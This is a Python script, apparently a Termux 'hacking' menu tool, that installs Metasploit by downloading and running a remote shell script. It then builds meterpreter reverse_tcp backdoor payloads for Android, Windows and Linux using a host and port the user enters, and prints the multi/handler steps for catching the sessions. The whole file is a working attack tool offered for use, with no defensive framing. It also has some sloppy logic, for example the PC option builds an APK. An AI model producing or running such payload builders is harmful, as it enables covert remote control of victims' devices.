import os 
from time import sleep 
import pyfiglet
from sys import stdout

os.system("clear")

print("""\033[1;32m               V.1

███╗░░░███╗░█████╗░░█████╗░███╗░░██╗
████╗░████║██╔══██╗██╔══██╗████╗░██║
██╔████╔██║██║░░██║██║░░██║██╔██╗██║
██║╚██╔╝██║██║░░██║██║░░██║██║╚████║
██║░╚═╝░██║╚█████╔╝╚█████╔╝██║░╚███║
╚═╝░░░░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚══╝
  
""")
print("""
\t\t\b\b\b\b\033[1;32m#-------------CHOSE---------------#
\t\t\b\b\b\b\033[1;32m| [01] \033[1;37minstall Metaspolite\033[1;32m        |
\t\t\b\b\b\b\033[1;32m| [02] \033[1;37mHacking   \033[1;32m                 |
\t\t\b\b\b\b\033[1;32m#---------------------------------#""")
print("")

i = input("\033[1;32m[ + ] \033[1;37mEnter Number : ")

if i == "1":
	os.system("cd ~")
	os.system("apt update")
	os.system("apt upgrade -y")
	os.system("pkg install wget curl openssh git -y")
	os.system("apt install ncurses-utils")
	os.system("wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh")
	os.system("chmod +x metasploit.sh && ./metasploit.sh")
	os.system("msfconsole")


if i == "2":
	os.system("clear")
def banner () :
	fig = pyfiglet.figlet_format("Msfvenom", font = "slant")
	print ("\033[1;32m",fig)
	print ("")
	print ("-" * 50)
	print ("\t\t\b\b\b\b","Develper  :\033[1;37m Mohamed Gafar \n\t\t\b\b\b\b \033[1;32mDeveloper :\033[1;37m Muntahi \n\t\t\b\b\b\b \033[1;32mChannel   :\033[1;37m @OOO0S1")
	print ("\033[1;32m-" * 50) 
	print ("")
banner()

#======= OPtions ======
try :
    print("""
\t\t\b\b\b\b\033[1;32m#-------------SYSTEMS-------------#
\t\t\b\b\b\b\033[1;32m| [01] \033[1;37mAndroid\033[1;32m                    |
\t\t\b\b\b\b\033[1;32m| [02] \033[1;37mWindows           \033[1;32m         |
\t\t\b\b\b\b\033[1;32m| [03] \033[1;37mLinux       \033[1;32m               |
\t\t\b\b\b\b\033[1;32m| [00] \033[1;37mExit       \033[1;32m                |
\t\t\b\b\b\b\033[1;32m#---------------------------------#""")   
    print("") 
    chose = input("\033[1;32m[ + ]\033[1;37m Chose Any System : ")
    # Android Payload
    if chose == "1" :
    	sys = input("\033[1;32m[ + ]\033[1;37m What's Your System [Pc Or Phone] ? ").strip().capitalize()
    	if sys == "Phone" or sys == "2" : 
    	     print ("")
    	     host = input("\033[1;32m[ + ]\033[1;37m Enter Host : ")
    	     port = input("\033[1;32m[ + ]\033[1;37m Enter Port : ")
    	     name_apk = input("\033[1;32m[ + ]\033[1;37m Enter Payload Name : ")
    	     print("") 
    	     sleep(1)
    	     print(f"\033[1;32m[ + ]\033[1;37m Building {name_apk} Payload on Host {host} Port {port}.....")
    	     sleep(1.5)
    	     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + str(host) + " LPORT=" + str(port) + " -o /sdcard/" + name_apk + ".apk") 
    	     print ("\033[1;32m[ ✓ ]\033[1;37m Done Building Payload And Saved in Sdcard ")
    	     print("""
\033[1;32m#-------------- Listen To Session ---------------#
\033[1;32m|[01] \033[1;37mmsfconsole\033[1;32m                                 |
\033[1;32m|[02] \033[1;37muse exploit/multi/handler   \033[1;32m               |
\033[1;32m|[03] \033[1;37mset payload android/meterpreter/reverse_tcp\033[1;33|    
\033[1;32m|[04] \033[1;37mset LHOST + Your Host       \033[1;32m               | 
\033[1;32m|[04] \033[1;37mset LPORT + Your Port       \033[1;32m               |
\033[1;32m#------------------------------------------------#""")
    	elif sys == "Pc" or sys == "1" :
    		print ("")
    		pc_host = input("\033[1;32m[ + ]\033[1;37m Enter Host : ")
    		pc_port = input("\033[1;32m[ + ]\033[1;37m Enter Port : ")
    		pc_apk = input("\033[1;32m[ + ]\033[1;37m Enter Payload Name  : ") 
    		print ("") 
    		sleep(1) 
    		print(f"\033[1;32m[ + ]\033[1;37m Building {pc_apk} Payload on Host {pc_host} Port {pc_port}.....") 

    		sleep(1.5)
    		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + str(pc_host) + " LPORT=" + str(pc_port) + " -o /Desktop/" + pc_apk + ".apk") 
    		print("\033[1;32m[ ✓ ]\033[1;37m Done Building APK Payload And Saved in Desktop") 
    		print("""
\033[1;32m#-------------- Listen To Session ---------------#
\033[1;32m|[01] \033[1;37mmsfconsole\033[1;32m                                 |
\033[1;32m|[02] \033[1;37muse exploit/multi/handler   \033[1;32m               |
\033[1;32m|[03] \033[1;37mset payload android/meterpreter/reverse_tcp\033[1;33|    
\033[1;32m|[04] \033[1;37mset LHOST + Your Host       \033[1;32m               | 
\033[1;32m|[04] \033[1;37mset LPORT + Your Port       \033[1;32m               |
\033[1;32m#------------------------------------------------#""")
    	else :
    		print ("")
    		print("\033[1;31m[ + ]\033[1;37m Error :(")
    		
    		 
    		
    		
    # Windows Payload		
    elif chose == "2" :
    		print("")
    		 
    		win_bit = input("\033[1;32m[ + ]\033[1;37m What's The Bit Of Windows System [x86 Or x64] ? ")
    		# 32 bit 
    		if win_bit == "x86" or win_bit == "1" or win_bit == "32":
    			print("")
    			win_host =  input("\033[1;32m[ + ]\033[1;37m Enter Host : ")
    			win_port =  input("\033[1;32m[ + ]\033[1;37m Enter Port : ")
    			win_name = input("\033[1;32m[ + ]\033[1;37m Enter Payload Name : ")
    			print("")
    			sleep(1) 
    			print(f"\033[1;32m[ + ]\033[1;37m Building {win_name } Payload on Host {win_host} Port {win_port}.....") 
    			sleep(1.5)
    			os.system(f"msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST={win_host} LPORT={win_port} -ax86 -o /Desktop/{win_name}.exe") 
    			print("\033[1;32m[ ✓ ]\033[1;37m Done Building EXE Payload 32 Bit And Saved in Desktop")
    			  
    		# 64 Bit
    		elif win_bit == "\x64" or win_bit == "/x64" or win_bit == "2" or win_bit == "64" :
    			print("")
    			win_64_h =  input("\033[1;32m[ + ]\033[1;37m Enter Host : ")
    			win_64_p =  input("\033[1;32m[ + ]\033[1;37m Enter Port : ") 
    			win_64_n = input("\033[1;32m[ + ]\033[1;37m Enter Payload Name : ")
    			print("")
    			sleep(1.5)
    			print(f"\033[1;32m[ + ]\033[1;37m Building {win_64_n } Payload on Host {win_64_h} Port {win_64_p}.....") 
    			os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={win_64_h} LPORT={win_64_p} -ax64 -o /Desktop/{win_64_n}.exe") 

    			print("\033[1;32m[ ✓ ]\033[1;37m Done Building EXE Payload 64 Bit  And Saved in Desktop")  
    		else :
    			print ("")   		
    			print("\033[1;31m[ + ]\033[1;37m Error :(") 
    # Linux Payload 
    elif chose == "3" :
    	print ("")
    	lin_bit =  input("\033[1;32m[ + ]\033[1;37m What's The Bit Of Windows System [x86 Or x64] ? ") 
    	#  32 Bit 
    	if lin_bit == "x86"  or lin_bit == "1" or lin_bit == "32" :
    		print("")
    		lin_32_h = input("\033[1;32m[ + ]\033[1;37m Enter Host : ") 
    		lin_32_p = input("\033[1;32m[ + ]\033[1;37m Enter Port : ") 
    		lin_32_n = input("\033[1;32m[ + ]\033[1;37m Enter Payload Name : ") 
    		print ("") 
    		sleep(1)
    		
    		print (f"\033[1;32m[ + ]\033[1;37m Building {lin_32_n } Payload on Host {lin_32_h} Port {lin_32_p}.....")
    		sleep(1.5) 
    		os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lin_32_h} LPORT={lin_32_p} -ax86 -o /Desktop/{lin_32_n}.elf") 

    		print("\033[1;32m[ ✓ ]\033[1;37m Done Building ELF Payload 32 Bit  And Saved in Desktop") 
    	elif lin_bit == "x64" or lin_bit == "2" or lin_bit == "64" :
    	     print("")
    	     lin_64_h = input("\033[1;32m[ + ]\033[1;37m Enter Host : ") 
    	     lin_64_p = input("\033[1;32m[ + ]\033[1;37m Enter Port : ")
    	     lin_64_n = input("\033[1;32m[ + ]\033[1;37m Enter Payload Name : ")
    	     print("")
    	     sleep(1) 
    	     print (f"\033[1;32m[ + ]\033[1;37m Building {lin_64_n } Payload on Host {lin_64_h} Port {lin_64_p}.....")
    	     sleep(1.5)
    	     os.system(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lin_64_h} LPORT={lin_64_p} -ax64 -o /Desktop/{lin_64_n}.elf")

    	     print("\033[1;32m[ ✓ ]\033[1;37m Done Building ELF Payload 64 Bit  And Saved in Desktop")
 
  
   
    
     
    elif chose == "00" :
          print("")
          load = """\033[1;32m[ + ]\033[1;37m Thanks For Using ⁠^⁠_⁠^ """ 
          for char in load :
          	stdout.write(char)
          	stdout.flush()
          	sleep(0.001/0.02)
          print("")
          print("")

 
  
    else :
          print("")
          
         
      
   
    	     
    	 
    		
    		
    		 
    		 
    	
    	
    	
    			
    			
    			 
    			 
    			
    			
    			
    			 
    		
    			
 
    		
    		
    		
    		
    		
    
    	
   
except :
	print("")
	print("\033[1;31m[ + ] Error, Metaspolite Not Found ") 

